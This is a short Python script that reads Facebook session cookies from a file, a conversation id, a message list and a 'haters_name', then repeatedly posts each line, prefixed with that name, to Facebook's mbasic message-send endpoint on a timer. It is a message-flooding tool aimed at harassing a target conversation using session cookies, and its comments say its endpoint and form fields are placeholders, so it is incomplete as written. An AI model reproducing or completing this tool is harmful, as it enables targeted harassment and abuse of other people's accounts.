import requests
import time
import threading
import random
from platform import system
import os

def cls():
    if system() == 'Linux':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')

def liness():
    print('\u001B[37m' + '---------------------------------------------------')

def send_messages():
    with open('cookies.json', 'r') as file:
        import json
        cookies = json.load(file)  # Should be a dict: {"c_user":"...", "xs":"...", ...}

    with open('IB.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('FL.txt', 'r') as file:
        text_file_path = file.read().strip()

    with open(text_file_path, 'r') as file:
        messages = file.readlines()
    num_messages = len(messages)

    with open('HN.txt', 'r') as file:
        haters_name = file.read().strip()
    with open('TM.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

    liness()
    # NOTE: This endpoint and params are for illustration. You have to use endpoint sniffed from browser:
    # For example: https://mbasic.facebook.com/messages/send/?icm=1
    url = "https://mbasic.facebook.com/messages/send/"
    for message_index in range(num_messages):
        message = messages[message_index].strip()
        data = {
            'body': haters_name + ' ' + message,
            'tids': convo_id,   # use correct keys from browser requests
            # include other required form fields here like 'fb_dtsg', 'jazoest', etc.
        }
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
        if response.ok:
            print(f"[+] Messages {message_index+1} of Convo {convo_id}: {message}")
            print(f" - Time: {current_time}")
            liness()
        else:
            print(f"[x] Failed to send message {message_index+1} of Convo {convo_id}: {message}")
            print(f" - Time: {current_time}")
            liness()
        time.sleep(speed)
    print("[+] All messages sent. Restarting the process...")

def main():
    send_messages()

if __name__ == '__main__':
    main()
